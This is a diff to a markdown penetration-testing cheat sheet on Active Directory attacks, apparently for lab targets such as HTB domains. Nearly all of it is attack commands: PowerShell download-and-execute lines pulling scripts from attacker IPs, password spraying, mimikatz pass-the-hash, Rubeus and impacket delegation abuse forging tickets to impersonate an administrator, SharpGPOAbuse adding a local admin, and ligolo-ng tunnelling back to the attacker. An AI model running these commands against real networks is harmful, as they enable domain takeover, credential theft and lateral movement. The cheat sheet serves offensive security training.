@@ -739,6 +739,7 @@ kerbrute passwordspray ./userlist Password123! --dc 10.10.10.248 -d active.htb
 ```
 ### mimikatz
 ```powershell
+cd /usr/share/windows-resources/powersploit/Exfiltration/
 cd /opt/mimikatz/x64
 
 # PTH
@@ -1092,7 +1093,7 @@ Credential Discovery
 #### Sharphound
 ```powershell
 # Sharphound
-cd /usr/lib/bloodhound/resources/app/Collectors/
+cd /usr/share/sharphound/
 IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.14.37/SharpHound.ps1')
 Invoke-BloodHound -CollectionMethod All -Domain htb.local -DomainController 10.10.10.1 -OutputDirectory C:\Users\stephanie\Desktop\ -OutputPrefix "Name"
 
@@ -1385,6 +1386,7 @@ WriteSPN, WriteProperty, GenericWrite and Delegate
 ##### Ghost
 ```powershell
 # Hijack Ghost
+wget https://raw.githubusercontent.com/juliourena/plaintext/master/Powershell/Get-ConstrainedDelegation.ps1
 IEX(New-Object System.Net.WebClient).DownloadString('http://10.10.15.96/Get-ConstrainedDelegation.ps1')
 Get-ConstrainedDelegation -CheckOrphaned
 # WriteSPN
@@ -1420,9 +1422,20 @@ Set-DomainObject -Identity Hijack_PC -Clear 'serviceprincipalname' -Verbose
 Set-DomainObject -Identity target_PC -Set @{serviceprincipalname='MSSQL/Hijack_PC'} -Verbose
 
 # Get Ticket
+## req rc4
+.\Rubeus.exe hash /domain:inlanefreight.local /user:OWN_PC$ /password:'Password123!'
+## Ticket by Rubeus
 .\Rubeus.exe s4u /domain:inlanefreight.local /user:OWN_PC$ /rc4:OWN_PC /impersonateuser:administrator /msdsspn:"MSSQL/Hijack_PC" /nowrap
 .\Rubeus.exe tgssub /ticket:<hijack_ticket> /altservice:HTTP/target_PC /nowrap
 .\Rubeus.exe ptt /ticket:<new_ticket>
+## Ticket by impacket
+impacket-getST -spn 'MSSQLSvc/Hijack_PC' -impersonate Administrator 'inlanefreight.local/OWN_PC$' -hashes :2B576ACBE6BCFDA7294D6BD18041B8FE -dc-ip 172.19.99.10
+### alt ticket
+git clone -b tgssub https://github.com/ShutdownRepo/impacket/ tgssub
+python3 tgssub/examples/tgssub.py -in 'Administrator@MSSQLSvc_db2000@INLANEFREIGHT.LOCAL.ccache' -altservice "cifs/target_PC" -out newticket.ccache 
+#### vim /etc/hosts
+KRB5CCNAME=newticket.ccache impacket-smbexec -k -no-pass SDE01
+
 
 # Restore SPN
 cat SPN.txt | awk '{printf "\x27%s\x27,", $0}'
@@ -1448,8 +1461,11 @@ Get-GPOEnumeration -CreateGPO
 # where OU are PC
 Get-DomainOU | foreach { $ou = $_.distinguishedname; Get-DomainComputer -SearchBase $ou -Properties dnshostname | select @{Name='OU';Expression={$ou}}, @{Name='FQDN';Expression={$_.dnshostname}} }
 
+# Create GPO
+New-GPO -Name TestGPO -Comment "This is a test GPO."
 # Create GPO link
 New-GPLink -Name TestGPO -Target "OU=TestOU,DC=inlanefreight,DC=local"
+
 # Abuse GPO add local admin 
 ## --force
 .\SharpGPOAbuse.exe --AddLocalAdmin --UserAccount own_user --GPOName "TestGPO" 
@@ -1852,9 +1868,9 @@ tar -zxvf ligolo-ng_agent_0.6.2_linux_amd64.tar.gz
 wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.6.2/ligolo-ng_agent_0.6.2_windows_amd64.zip
 unzip ligolo-ng_agent_0.6.2_windows_amd64.zip
 
-ip tuntap add user root mode tun ligolo
-ip link set ligolo up
-./proxy -selfcert -laddr 0.0.0.0:2345
+sudo ip tuntap add user root mode tun ligolo
+sudo ip link set ligolo up
+sudo ./proxy -selfcert -laddr 0.0.0.0:2345
 
 ./agent -connect 192.168.45.10:2345 -ignore-cert
 .\agent.exe -connect 192.168.45.10:2345 -ignore-cert
@@ -1864,8 +1880,8 @@ session : 1
 start 
 ifconfig 
 
-ip route add 172.16.0.0/16 dev ligolo
-ip route delete 172.16.0.0/16 dev ligolo
+sudo ip route add 172.16.0.0/16 dev ligolo
+sudo ip route delete 172.16.0.0/16 dev ligolo
 ip route
 
 # Transport Kali Web
